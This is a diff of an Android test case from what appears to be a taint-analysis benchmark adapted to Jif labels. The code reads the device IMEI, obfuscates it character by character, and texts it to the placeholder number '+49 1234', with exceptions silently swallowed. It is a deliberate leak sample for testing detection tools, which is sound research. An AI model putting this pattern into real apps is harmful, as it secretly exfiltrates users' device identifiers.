@@ -18,6 +18,8 @@ import jif.runtime.Runtime;
  * @dataflow source -> imei -> obfuscated -> sink
  * @number_of_leaks 1
  * @challenges the analysis must handle standard java constructs
+	* ADAPTACIONES: -cambio de iterador por for
+	* - captura de excepciones  NullPointerException, ClassCastException ignore
  */
 public class LoopExample1 extends Activity {
 static Context context;
@@ -25,11 +27,18 @@ static Context context;
     protected void onCreate{}(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout);
-        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-        String {Alice:}imei = telephonyManager.getDeviceId();
-        String obfuscated = "";
-        for (char c : imei.toCharArray()) obfuscated += c + "_";
-        SmsManager sm = SmsManager.getDefault();
-        sm.sendTextMessage("+49 1234", null, obfuscated, null, null);
+        try {
+            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            String {Alice:}imei = telephonyManager.getDeviceId();
+            String obfuscated = "";
+            char c[] = imei.toCharArray();
+            for (int i = 0; i < c.length; i++) {
+                obfuscated += c[i] + "_";
+            }
+            SmsManager sm = SmsManager.getDefault();
+            sm.sendTextMessage("+49 1234", null, obfuscated, null, null);
+        } catch (NullPointerException e) {
+        } catch (ClassCastException ignore) {
+        }
     }
 }
